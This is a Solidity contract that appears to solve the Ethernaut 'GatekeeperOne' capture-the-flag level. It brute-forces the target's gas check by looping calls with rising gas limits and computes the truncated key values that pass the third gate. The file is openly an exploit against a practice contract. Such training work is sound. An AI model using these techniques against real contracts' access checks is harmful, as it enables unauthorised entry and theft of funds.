// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import "interfaces/IGatekeeperOne.sol";

contract GatekeeperOneAttack {
    IGatekeeperOne gatekeeper;

    event AttackAttempt(uint256 extraGasLimit);

    constructor(IGatekeeperOne _gatekeeper) public {
        gatekeeper = _gatekeeper;
    }

    function getGateThreeValues(bytes8 _gateKey)
        external
        view
        returns (
            uint32,
            uint16,
            uint64,
            uint16
        )
    {
        return (
            uint32(uint64(_gateKey)),
            uint16(uint64(_gateKey)),
            uint64(_gateKey),
            uint16(tx.origin)
        );
    }

    function attack(bytes8 _gateKey, uint256 initialGasLimit) external {
        bool success = false;
        uint256 extraGasLimit = 0;

        while (!success && extraGasLimit < 1000) {
            emit AttackAttempt(extraGasLimit);
            (success, ) = address(gatekeeper).call{
                gas: initialGasLimit + extraGasLimit
            }(abi.encodeWithSignature("enter(bytes8)", _gateKey));
            extraGasLimit++;
        }
    }
}
